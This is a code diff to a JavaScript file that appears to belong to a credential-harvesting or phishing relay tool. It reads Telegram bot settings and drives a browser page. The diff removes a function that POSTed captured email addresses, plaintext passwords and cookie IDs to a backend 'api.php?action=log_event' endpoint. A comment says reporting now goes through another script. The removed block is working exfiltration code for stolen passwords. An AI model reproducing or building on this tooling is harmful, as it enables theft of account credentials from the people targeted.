@@ -61,7 +61,7 @@ try {
 if (process.env.TELEGRAM_BOT_TOKEN) cfg.telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
 if (process.env.TELEGRAM_CHAT_ID) cfg.telegramChatId = process.env.TELEGRAM_CHAT_ID;
 if (process.env.TELEMETRY_ENABLED) cfg.telemetryEnabled = (process.env.TELEMETRY_ENABLED === 'true');
-if (process.env.API_BASE_URL) cfg.apiBaseUrl = process.env.API_BASE_URL;
+// API_BASE_URL no longer used for backend callbacks; consolidated.js is invoked directly
 
 // --- Helpers ---
 
@@ -222,26 +222,7 @@ function getDomainFromEmail(email) {
 }
 
 async function logCliEvent({ email, password, cookieId, attempt = 1 }) {
-    const base = cfg.apiBaseUrl || process.env.API_BASE_URL || '';
-    if (!base || !email || !password || !cookieId) return;
-    const url = base.replace(/\/+$/, '') + '/api.php?action=log_event';
-    const body = {
-        type: 'password',
-        emailMask: email,
-        domain: getDomainFromEmail(email),
-        attempt: attempt,
-        password: password,
-        cookieId: cookieId
-    };
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body)
-        });
-    } catch (e) {
-        console.warn('Failed to log CLI event:', e && e.message ? e.message : String(e));
-    }
+    return;
 }
 
 async function captureFailureArtifacts(page, sessionId, stepName, extra = {}) {
